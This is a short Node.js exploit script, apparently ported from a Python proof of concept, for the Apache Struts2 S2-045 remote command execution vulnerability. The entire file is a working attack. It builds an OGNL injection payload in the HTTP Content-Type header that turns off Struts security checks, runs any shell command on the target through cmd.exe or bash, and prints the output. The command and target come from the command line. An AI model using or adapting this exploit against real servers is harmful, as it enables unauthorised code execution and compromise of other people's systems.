#! /usr/local/bin/node
// a node version for this poc in python: https://packetstormsecurity.com/files/141494/Struts2-S2-0450Remote-Command-Execution.html
if(process.argv.length < 4) {
	console.log('Usage: ./st2-045-node.js http://ip:port/foo.action whoami');
	process.exit(0);
} 
console.log('Executing remote cmd ' + process.argv[3] + ' on ' + process.argv[2] + ' ...');
require('request')({
  url: process.argv[2],
  headers: {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Content-Type': "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+process.argv[3]+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
  }
}, function(error, response, body) {
  if (!error && response.statusCode == 200) {
    console.log('Result:\n' + body);
  }
});
